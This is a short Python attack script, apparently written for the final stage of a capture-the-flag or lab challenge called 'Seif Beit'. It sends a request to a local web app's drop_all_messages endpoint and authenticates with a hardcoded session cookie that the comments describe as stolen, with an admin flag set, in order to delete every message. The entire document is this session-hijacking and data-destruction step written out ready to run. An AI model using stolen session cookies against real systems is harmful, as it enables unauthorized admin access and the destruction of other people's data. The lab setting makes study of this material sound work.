# I wrote this script in order to do the final stage in Seif Beit: delete the actual messages
# After finding the session and the correct path we just send a request to this path using the cookie

import requests
import warnings
warnings.filterwarnings('ignore')

# The cookie we stole
cookies = {
    "session": "eyJjc3JmX3Rva2VuIjoibzhNa2pBY0hhbFY2Nk5rWUpSeVZMdz09IiwiaXNfYWRtaW4iOnRydWV9.ah8csg.FQD1lh0WZQNmLv8_zT21RgYsL0A"
}

response = requests.get(
    "https://localhost:5000/drop_all_messages",
    cookies=cookies,
    verify=False
)

print(f"Status: {response.status_code}")
print(f"Response: {response.text}")